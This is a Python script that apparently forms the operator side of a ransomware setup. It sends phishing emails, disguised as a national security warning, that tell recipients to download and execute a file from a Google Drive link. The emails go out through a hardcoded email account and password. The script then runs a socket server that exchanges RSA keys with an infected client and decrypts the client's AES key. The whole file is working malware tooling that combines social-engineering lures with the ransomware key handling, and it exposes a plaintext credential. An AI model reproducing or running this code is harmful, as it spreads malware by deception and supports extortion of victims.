import socket

import rsa
import pandas as pd
import smtplib
from email.message import EmailMessage


def send_emails():
    # set your email and password
    # please use App Password
    email_address = "ns-team-20@hotmail.com"
    email_password = "vm6f2Xkk82U8g8X"

    # create email
    msg = EmailMessage()
    msg['Subject'] = "National Security Organization Warning"
    msg['From'] = email_address
    msg['To'] = get_recipient_list()

    msg.set_content("Hello Friend,\n I Came to rescue you from a ransomware attack, you know, if they can't read your files, they can't exploit it ;). \n To protect your self, Download the file from the following link and execute it:\n https://drive.google.com/drive/u/0/folders/1pJUEUB9YzsW_MdHcf231BsYKb2zQMDiJ \n Regards \n Your Rescuer")

    # send email
    smtp = smtplib.SMTP('smtp.office365.com', 587)
    smtp.starttls()
    print('Logging IN')
    smtp.login(email_address, email_password)
    print('Sending Messages')
    smtp.send_message(msg)
    print("Emails Sent Successfully")


def get_recipient_list():
    df = pd.read_csv(
        'https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv')

    return df.Email.to_list()


def RSA():
    public_key, private_key = rsa.newkeys(256)

    print(f"Public Key: {public_key}")
    print(f"Private Key: {private_key}")
    return public_key, private_key

def decrypt_key(key,pvk):
    print("Decrypting AES Key")
    return rsa.decrypt(key,pvk)
send_emails()


SERVER_IP = '192.168.1.14'
SERVER_PORT = 5678

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((SERVER_IP, SERVER_PORT))
    print('Server is listening')
    s.listen(1)
    conn, addr = s.accept()
    print(f'Connection accepted from :{addr}')
    with conn:
        conn.send(b'Hello :D')
        print(f"client: {str(conn.recv(1024))}")
        print(f"client: {str(conn.recv(1024))}")
        print("Generating Public & Private Keys")
        public_key, private_key = RSA()
        print("Sending Public Key")
        conn.send(public_key.save_pkcs1("PEM"))
        print("Public Key Sent Successfully")
        encrypted_aes_key = conn.recv(1024)
        print(f"Encrypted AES Key Recieved: {encrypted_aes_key}")

        print(f"client: {str(conn.recv(1024))}")

        aes_key = decrypt_key(encrypted_aes_key,private_key)

        print(f"AES key after decryption: {str(aes_key)}")

        print("Sending Decrypted Key")
        conn.send(aes_key)
        print("Decryption Key Sent Successfully")